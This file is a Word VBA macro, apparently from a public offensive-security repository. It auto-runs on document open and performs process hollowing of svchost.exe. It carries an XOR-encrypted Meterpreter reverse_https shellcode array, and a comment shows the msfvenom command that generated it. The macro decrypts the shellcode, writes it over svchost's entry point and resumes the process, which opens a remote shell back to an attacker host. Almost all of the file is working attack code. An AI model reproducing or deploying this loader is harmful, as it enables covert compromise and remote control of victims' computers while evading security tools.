' Source: https://github.com/ColeHouston/word-vba-process-hollowing

#If Win64 Then
    Private Declare PtrSafe Function ZwQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long
    Private Declare PtrSafe Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
    Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
    Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
    Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
    Private Declare PtrSafe Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)
    Private Declare PtrSafe Function GetProcAddress Lib "KERNEL32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
    Private Declare PtrSafe Function LoadLibraryA Lib "KERNEL32" (ByVal lpLibFileName As String) As LongPtr
    Private Declare PtrSafe Function VirtualProtect Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
    Private Declare PtrSafe Function CryptBinaryToStringA Lib "CRYPT32" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, pcchString As Any) As Long
#Else
    Private Declare Function ZwQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long
    Private Declare Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
    Private Declare Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
    Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
    Private Declare Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
    Private Declare Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)
    Private Declare Function GetProcAddress Lib "KERNEL32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
    Private Declare Function LoadLibraryA Lib "KERNEL32" (ByVal lpLibFileName As String) As LongPtr
    Private Declare Function VirtualProtect Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
    Private Declare Function CryptBinaryToStringA Lib "CRYPT32" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, pcchString As Any) As Long
#End If

Private Type PROCESS_BASIC_INFORMATION
    Reserved1 As LongPtr
    PebAddress As LongPtr
    Reserved2 As LongPtr
    Reserved3 As LongPtr
    UniquePid As LongPtr
    MoreReserved As LongPtr
End Type

Private Type STARTUPINFOA
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As String
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

Sub Document_Open()
    hollow
End Sub

Sub AutoOpen()
    hollow
End Sub

' Performs process hollowing to run shellcode in svchost.exe
Function hollow()
    Dim si As STARTUPINFOA
    RtlZeroMemory si, Len(si)
    si.cb = Len(si)
    si.dwFlags = &H100
    Dim pi As PROCESS_INFORMATION
    Dim procOutput As LongPtr
    ' Start svchost.exe in a suspended state
    procOutput = CreateProcessA(vbNullString, "C:\\Windows\\System32\\svchost.exe", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)
    
    Dim ProcBasicInfo As PROCESS_BASIC_INFORMATION
    Dim ProcInfo As LongPtr
    ProcInfo = pi.hProcess
    Dim PEBinfo As LongPtr

#If Win64 Then
    zwOutput = ZwQueryInformationProcess(ProcInfo, 0, ProcBasicInfo, 48, 0)
    PEBinfo = ProcBasicInfo.PebAddress + 16
    Dim AddrBuf(7) As Byte
#Else
    zwOutput = ZwQueryInformationProcess(ProcInfo, 0, ProcBasicInfo, 24, 0)
    PEBinfo = ProcBasicInfo.PebAddress + 8
    Dim AddrBuf(3) As Byte
#End if

    Dim tmp As Long
    tmp = 0
#If Win64 Then
    ' Read 8 bytes of PEB to obtain base address of svchost in AddrBuf
    readOutput = ReadProcessMemory(ProcInfo, PEBinfo, AddrBuf(0), 8, tmp)
    svcHostBase = AddrBuf(7) * (2 ^ 56)
    svcHostBase = svcHostBase + AddrBuf(6) * (2 ^ 48)
    svcHostBase = svcHostBase + AddrBuf(5) * (2 ^ 40)
    svcHostBase = svcHostBase + AddrBuf(4) * (2 ^ 32)
    svcHostBase = svcHostBase + AddrBuf(3) * (2 ^ 24)
    svcHostBase = svcHostBase + AddrBuf(2) * (2 ^ 16)
    svcHostBase = svcHostBase + AddrBuf(1) * (2 ^ 8)
    svcHostBase = svcHostBase + AddrBuf(0)
#Else
    ' Read 4 bytes of PEB to obtain base address of svchost in AddrBuf
    readOutput = ReadProcessMemory(ProcInfo, PEBinfo, AddrBuf(0), 4, tmp)
    svcHostBase = AddrBuf(3) * (2 ^ 24)
    svcHostBase = svcHostBase + AddrBuf(2) * (2 ^ 16)
    svcHostBase = svcHostBase + AddrBuf(1) * (2 ^ 8)
    svcHostBase = svcHostBase + AddrBuf(0)
#End if

    Dim data(512) As Byte
    ' Read more data from PEB so e_lfanew offset can be retrieved
    readOutput2 = ReadProcessMemory(ProcInfo, svcHostBase, data(0), 512, tmp)
    
    ' Read e_lfanew offset value and add 40
    Dim e_lfanew_offset As Long
    e_lfanew_offset = data(60)

    Dim opthdr As Long
    opthdr = e_lfanew_offset + 40
    
    ' Construct relative virtual address for svchost's entry point
    Dim entrypoint_rva As Long
    entrypoint_rva = data(opthdr + 3) * (2 ^ 24)
    entrypoint_rva = entrypoint_rva + data(opthdr + 2) * (2 ^ 16)
    entrypoint_rva = entrypoint_rva + data(opthdr + 1) * (2 ^ 8)
    entrypoint_rva = entrypoint_rva + data(opthdr)

    Dim addressOfEntryPoint As LongPtr
    ' Add base address of svchost with the entry point RVA to get the start of the buffer to overwrite with shellcode
    addressOfEntryPoint = entrypoint_rva + svcHostBase
    
    ' Buffer for malicious crypted shellcode needs to go here
    Dim sc As Variant
    Dim key As String
    ' TODO change the key
    key = "osep2026"

' msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 'osep2026'
sc=Array(147,155,234,112,50,48,82,191,138,66,183,20,185,98,2,189,61,127,238,34,38,187,64,30,94,140,106,199,120,22,3,246,195,79,4,12,48,28,18,247,160,126,100,183,123,69,221,100,228,33,117,39,185,114,14,55,191,248,37,8,183,240,70,122,110,163,53,251,106,16,51,229,228,59,125,245,251,68,14,127,94,140,238,68,185,49,228,7,175,223,164,191,63,49,245,14,143,6,145,115,79,200,9,75,75,6,133,40,185,104,22,55,188,21,238,124,121,187,106,42,110,160,238,116,185,49,226,191,43,87,65,43,105,81,107,108,62,140,133,40,109,106,185,36,134,243,154,143,205,109,90,88,10,7,101,24,69,89,92,95,59,27,41,7,20,55,205,227,94,168,54,35,97,99,97,222,62,115,101,112,127,95,72,95,3,31,4,95,7,30,2,22,71,36,12,30,86,95,69,69,79,61,49,80,3,0,28,6,84,83,50,25,92,6,6,13,79,11,83,68,9,16,64,64,85,66,86,67,28,0,27,22,40,22,6,27,93,31,0,6,94,67,85,65,2,1,18,112,6,1,0,22,93,72,29,7,92,64,75,64,50,88,8,96,22,212,154,165,97,99,88,53,60,32,13,203,51,48,50,222,220,115,101,112,29,93,64,91,60,57,49,9,75,64,66,114,58,38,92,38,97,70,85,27,21,0,36,42,3,96,120,93,63,20,55,0,101,70,93,54,63,27,50,249,173,246,205,227,230,181,54,24,50,2,218,178,60,32,54,39,97,102,90,221,58,93,94,143,231,166,88,60,48,27,229,67,50,48,187,214,5,119,53,26,45,102,90,67,41,237,227,143,231,99,97,101,60,37,13,93,52,40,73,201,186,246,165,5,38,88,186,37,111,115,13,52,194,5,210,201,186,60,16,189,218,123,50,54,111,25,37,24,50,32,50,54,7,115,101,48,50,99,90,110,203,32,128,143,231,163,97,101,230,148,50,24,50,16,50,54,60,37,13,98,164,185,208,201,186,246,165,4,253,187,53,55,172,246,165,5,215,104,241,105,135,24,154,143,205,1,11,4,65,66,83,72,28,4,7,24,94,74,81,112,137,208,47,28,101,27,195,229,143,173,205,227,83,117,25,122,178,203,210,67,106,200,34,99,64,95,88,54,60,140,176)

    Dim scSize As Long
    scSize = UBound(sc)
    ' Decrypt shellcode
    Dim keyArrayTemp() As Byte
    keyArrayTemp = key
    
    i = 0
    For x = 0 To UBound(sc)
        sc(x) = sc(x) Xor keyArrayTemp(i)
        i = (i + 2) Mod (Len(key) * 2)
    Next x
    
    ' TODO set the SIZE here (use a size > to the shellcode size)
    Dim buf(685) As Byte
    For y = 0 To UBound(sc)
        buf(y) = sc(y)
    Next y
    
    ' Write the shellcode into the svchost.exe entry point
    a = WriteProcessMemory(ProcInfo, addressOfEntryPoint, buf(0), scSize, tmp)
    ' Resume svchost.exe process to run the shellcode
    b = ResumeThread(pi.hThread)
 
End Function
